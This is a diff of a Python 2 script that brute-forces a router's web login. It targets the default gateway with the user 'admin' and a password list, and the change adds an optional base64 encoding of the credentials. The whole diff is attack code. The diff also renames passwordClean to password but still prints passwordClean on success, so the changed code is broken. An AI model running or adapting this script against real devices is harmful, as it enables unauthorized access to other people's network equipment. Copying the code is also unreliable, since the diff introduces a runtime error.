@@ -100,7 +100,12 @@ def getTargetFormInfo(url):
 
 	return answer
 
-login = base64.b64encode('admin')
+encodeBase64 = False
+login = 'admin'
+
+if(encodeBase64):
+	login = base64.b64encode(login)
+
 passwords = getPasswordList()
 url = getDefaultGateway()
 formInfo = getTargetFormInfo(url)
@@ -109,10 +114,11 @@ print 'Scanning list of passwords.'
 i = 0
 total = len(passwords)
 for l in passwords:
-	passwordClean = re.sub(r'[^\w]', '', l)
-	print('Total : ' + str(i) + '/' + str(total) + '           \r'),
+	password = re.sub(r'[^\w]', '', l)
+	print('Total : ' + str(i) + '/' + str(total) + '       \r'),
 	sys.stdout.flush()
-	password = base64.b64encode(passwordClean)
+	if(encodeBase64):
+		password = base64.b64encode(password)
 	result = submitForm(login, password, url, formInfo)
 	if result:
 		print passwordClean
